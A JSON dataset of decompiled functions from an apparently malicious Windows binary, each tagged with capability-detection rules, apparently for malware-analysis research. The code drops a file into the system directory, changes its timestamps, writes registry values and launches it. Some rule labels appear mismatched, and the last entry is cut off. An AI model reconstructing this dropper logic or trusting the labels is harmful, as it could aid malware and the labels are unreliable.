{
    "004010b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004010b0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004020c0(0x407014);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "00401d00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d4e) overlaps instruction at (ram,0x00401d4c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401d00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint var_4h;\n    \n    iVar1 = fcn.004031f0(0x407080);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(iVar2);\n        bVar4 = iVar3 == 0;\n        if (!bVar4) {\n            if ((!bVar4) && (bVar4)) {\n                iVar1 = iVar2;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 291
    },
    "00401dd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401dd0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    *0x423468 = fcn.004032c0();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar2 != 0) {\n        bVar5 = *0x423468 == 0;\n        if (!bVar5) {\n            iVar2 = fcn.00401d00(arg_8h_00);\n            *0x423468 = iVar2 == 0;\n            bVar5 = iVar2 != 0;\n        }\n        if ((!bVar5) && (bVar5)) {\n            puVar4 = &stack0xffffffb8;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        fcn.00403550(0, arg_8h_00);\n        if (*0x423468 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 407
    },
    "004024a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004026ee) overlaps instruction at (ram,0x004026ec)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402502)\n// WARNING: Removing unreachable block (ram,0x004024eb)\n// WARNING: Removing unreachable block (ram,0x004024f7)\n// WARNING: Removing unreachable block (ram,0x00402500)\n// WARNING: Removing unreachable block (ram,0x00402490)\n// WARNING: Removing unreachable block (ram,0x0040252a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004024a0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &var_213h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    s = 0;\n    puVar4 = &var_10fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_ch = 1;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407034);\n    fcn.00403170(&var_4h, &var_8h);\n    iVar3 = fcn.00402ec0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = fcn.00401dd0(&s, var_4h, var_8h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.004037a0();\n    iVar3 = fcn.004031f0(0x40706c);\n    if ((iVar3 != -1) || (iVar3 = fcn.004031f0(0x407060),  iVar3 != -1)) {\n        iVar3 = fcn.00404b50(arg_8h);\n        if (iVar3 != 0) {\n            fcn.00402820();\n            fcn.00403350();\n            return 1;\n        }\n        if (*0x423468 == 0) {\n            return 0;\n        }\n    }\n    uVar1 = fcn.00404600(arg_8h, &s);\n    iVar3 = var_ch;\n    if (uVar1 == 0) {\n        iVar3 = 0;\n    }\n    if ((uVar1 < 0x80000000) && (uVar1 >= 0x80000000)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((iVar3 != 0) && (iVar2 = fcn.00401000(arg_8h),  iVar2 == 0)) {\n        var_ch = 0;\n        iVar3 = iVar2;\n    }\n    if (iVar3 == 0) {\n        func_0x1018868e();\n        iVar3 = fcn.00402320(arg_8h + 1, iVar3);\n        var_ch = iVar3;\n    }\n    if (iVar3 != 0) {\n        fcn.00403350();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x407080);\n    return iVar3;\n}\n",
        "token_count": 991
    },
    "004031f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040323b)\n// WARNING: Removing unreachable block (ram,0x00403243)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004031f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x42343c)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_8h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x423440)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x004032a8:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_128h;\n            iVar1 = var_8h;\n            goto code_r0x004032a8;\n        }\n        iVar2 = (**0x423444)(iVar1, &var_130h);\n    } while( true );\n}\n",
        "token_count": 403
    },
    "00403550": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040368e) overlaps instruction at (ram,0x0040368c)\n// \n// WARNING: Removing unreachable block (ram,0x0040368e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403550(uint arg_8h, uchar *arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uint16_t in_ES;\n    uchar *puVar13;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    uchar *var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar6 = &var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_12ch = '\\0';\n    puVar6 = &var_12bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar4 = 0xffffffff;\n    pcVar9 = &lpBuffer;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar6 = pcVar8 + -uVar4;\n    puVar11 = &var_12ch;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar9 = 0x40704c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar9 = &var_12ch;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar8 + -uVar4;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    puVar13 = &var_12ch;\n    puVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar13, 0, &var_28h);\n    puVar7 = var_4h;\n    puVar12 = arg_ch;\n    if ((arg_ch == 0xffffffff) &&\n       (puVar2 = fcn.004020c0(arg_8h),  puVar7 = puVar2,  puVar12 = puVar2,  puVar2 == 0xffffffff)) {\n        return 0;\n    }\n    if ((-2 < puVar12) && (puVar12 < -1)) {\n        puVar13 = puVar13 & 0xffff0000 | in_ES;\n        puVar7 = puVar7 + -1;\n        puVar12 = arg_ch | &stack0xfffffffc;\n        arg_ch = puVar12 + 1;\n        *puVar12 = puVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(puVar7, &lpCreationTime, &var_1ch, puVar13);\n    if (arg_ch == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar7);\n    }\n    return 1;\n}\n",
        "token_count": 1367
    },
    "00404840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404882) overlaps instruction at (ram,0x0040487e)\n// \n\nuint __cdecl fcn.00404840(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool bVar2;\n    \n    while( true ) {\n        arg_8h = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n        bVar2 = arg_8h != -1;\n        if (arg_8h == -1) {\n            return 1;\n        }\n        if ((bVar2) || (!bVar2)) break;\n        if (extraout_ECX == 1 || arg_8h != -1) {\n            *unaff_EDI = unaff_ESI + 4;\n            uVar1 = *(unaff_EBX + 0x5d);\n            *(unaff_EBX + 0x5d) = CONCAT11(bVar2, uVar1) >> 3 | uVar1 << 6;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 281
    },
    "00404890": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004049f6)\n\nbool fcn.00404890(void)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uint32_t uVar2;\n    uchar *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uint8_t in_IF;\n    bool bVar5;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uint var_1fh;\n    \n    bVar5 = false;\n    iVar1 = fcn.004022a0();\n    bVar4 = iVar1 == 0;\n    if (bVar4) {\n        return false;\n    }\n    fcn.004011c0();\n    if ((!bVar4) && (bVar4)) {\n        bVar5 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    iVar1 = fcn.004031f0(0x407078);\n    bVar4 = iVar1 == -1;\n    if (bVar4) {\n        fcn.00403fb0();\n        *0x42346c = 1;\n        if ((!bVar4) && (bVar4)) {\n            out(*unaff_ESI, extraout_DX);\n        }\n        iVar1 = fcn.004010b0();\n        if (iVar1 == 0) {\n            uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n            *(uVar2 - 0x20) = 0;\n            *(uVar2 - 0x80) = 0;\n            puVar3 = uVar2 - 0x1f;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + bVar5 * -2 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + bVar5 * -4 + 2) = 0;\n            *(uVar2 - 0x60) = 0;\n            puVar3 = uVar2 - 0x7f;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + bVar5 * -2 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + bVar5 * -4 + 2) = 0;\n            *(uVar2 - 0x40) = 0;\n            puVar3 = uVar2 - 0x5f;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + bVar5 * -2 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + bVar5 * -4 + 2) = 0;\n            puVar3 = uVar2 - 0x3f;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + bVar5 * -2 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + bVar5 * -4 + 2) = 0;\n            iVar1 = fcn.00401f70(uVar2 - 0x80, uVar2 - 0x60, uVar2 - 0x20, uVar2 - 0x40);\n            if (iVar1 != 0) {\n                iVar1 = fcn.00402a60(uVar2 - 0x20);\n                if (iVar1 != 0) {\n                    iVar1 = fcn.004024a0(uVar2 - 0x80, uVar2 - 0x60, uVar2 - 0x20, uVar2 - 0x40);\n                    return iVar1 != 0;\n                }\n                return false;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 961
    },
    "00404ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404fe0) overlaps instruction at (ram,0x00404fde)\n// \n// WARNING: Removing unreachable block (ram,0x00404fd2)\n// WARNING: Removing unreachable block (ram,0x00405022)\n// WARNING: Removing unreachable block (ram,0x0040502f)\n// WARNING: Removing unreachable block (ram,0x00404fe0)\n// WARNING: Removing unreachable block (ram,0x00404fde)\n\nvoid __cdecl\nfcn.00404ec0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint16_t extraout_CX;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar4 = false;\n    fcn.00403850(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    while( true ) {\n        fcn.00403850(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n        bVar4 = false;\n        bVar5 = false;\n        bVar3 = (arg_18h & extraout_CX) == 0;\n        fcn.00403850(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n        if ((bVar4 || bVar3) || (!bVar4 && !bVar3)) break;\n        if (!bVar5) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00403850(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.00404e70();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403360(0x80000001, 0x40725c, 0x407288, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4072d8),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 841
    },
    "004011c0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401229) overlaps instruction at (ram,0x00401227)\n// \n\nuint fcn.004011c0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    code *pcVar3;\n    char cVar6;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    int32_t extraout_ECX_00;\n    uint8_t uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    puVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407108);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar4 == NULL) {\n        return 0;\n    }\n    uVar8 = 0;\n    bVar9 = true;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar4, 0x407118);\n    uVar5 = uVar10;\n    if (!bVar9) {\n        if (bVar9) {\n            puVar2 = puVar4 + 1;\n            out(*puVar4, uVar10 >> 0x20);\n            uVar8 = in_AF;\n            do {\n                cVar6 = uVar5 >> 8;\n                uVar8 = 9 < (uVar5 & 0xf) | uVar8;\n                uVar5 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar6 - uVar8), -uVar8);\n                iVar7 = extraout_ECX;\n                puVar4 = puVar2;\n            } while (uVar8 || cVar6 == *(uVar10 >> 0x20));\n            goto code_r0x00401223;\n        }\n    }\n    *0x42343c = uVar5;\n    uVar11 = (*pcVar3)(puVar4, 0x407134);\n    uVar10 = uVar11 & 0xffffffff00000000 | *0x42343c;\n    uVar5 = uVar11;\n    iVar7 = extraout_ECX_00;\n    *0x423440 = uVar5;\ncode_r0x00401223:\n    *0x42343c = uVar10;\n    piVar1 = (uVar10 >> 0x20) * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar8;\n    *(iVar7 + 0x68) = uVar5;\n    *(puVar4 + -1) = *(puVar4 + -1) + (uVar10 >> 0x20);\n    *(pcVar3 + 0x423440) = *(pcVar3 + 0x423440) << (iVar7 & 0x1f);\n    *0x423444 = (*pcVar3)(puVar4, 0x407144);\n    if (((*0x42343c != 0) && (*0x423440 != 0)) && (*0x423444 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 723
    },
    "004012d0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.004012d0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar pvData;\n    uint var_10fh;\n    uchar *var_ch;\n    uint pdwType;\n    uint var_4h;\n    \n    pvData = 0;\n    var_4h = 0x104;\n    puVar2 = &var_10fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_ch = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (var_ch == NULL) {\n        return false;\n    }\n    *var_ch = 0;\n    iVar1 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar1 == 6) {\n        return true;\n    }\n    return iVar1 == 7;\n}\n",
        "token_count": 286
    },
    "004022a0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.004022a0(void)\n\n{\n    char cVar1;\n    uint extraout_ECX;\n    uint *puVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint uStack164;\n    uchar *puStack160;\n    uint *puStack156;\n    uint lpVersionInformation;\n    uint var_90h;\n    uint var_8ch;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    bVar5 = *0x10 == 0x98;\n    puStack156 = &fcn.004022a0::lpVersionInformation;\n    lpVersionInformation = 0x94;\n    puStack160 = 0x4022c0;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    puVar4 = &stack0xfffffffc;\n    if ((!bVar5) && (puVar4 = &stack0xfffffffc,  bVar5)) {\n        puVar3 = &stack0xffffff60;\n        puVar4 = &stack0xffffff60;\n        puStack160 = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar2;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    if (*(puVar4 + -0x90) != 5) {\n        puStack160 = extraout_ECX;\n        if ((*(puVar4 + -0x90) == 6) && (*(puVar4 + -0x8c) == 0)) {\n            return 1;\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 401
    },
    "004013c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004013c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar2 = 0;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n    return iVar1 == 0;\n}\n",
        "token_count": 183
    },
    "00402320": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402320(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(*0x10 + -0x164, 0x7090, arg_8h);\n    (*pcVar2)(*0x10 + -0x268, 0x70a8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070d0;\n    var_30h = 0x4070dc;\n    var_2ch = 0x4070e8;\n    var_28h = 0x4070f8;\n    var_24h = 0x407100;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1098
    },
    "004039f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403db3) overlaps instruction at (ram,0x00403db1)\n// \n\nvoid fcn.004039f0(void)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    code *pcVar3;\n    uint16_t in_AX;\n    uint8_t extraout_AH;\n    uint32_t uVar4;\n    uint8_t extraout_CH;\n    uint16_t extraout_CX;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    uint8_t extraout_CH_03;\n    uint *extraout_ECX;\n    uint8_t extraout_DL;\n    char extraout_DL_00;\n    uint8_t uVar5;\n    int32_t iVar6;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar7;\n    uchar uVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uchar uVar10;\n    char cVar11;\n    bool bVar12;\n    char cVar13;\n    ulong uVar14;\n    ulong uVar15;\n    uint in_stack_ffffffd8;\n    uint *puVar16;\n    uint in_stack_ffffffdc;\n    uint uVar17;\n    uint arg_14h;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h_00;\n    uint8_t *puVar18;\n    \n    uVar4 = ((in_AX & 0xff00 | in_AX & unaff_EBX 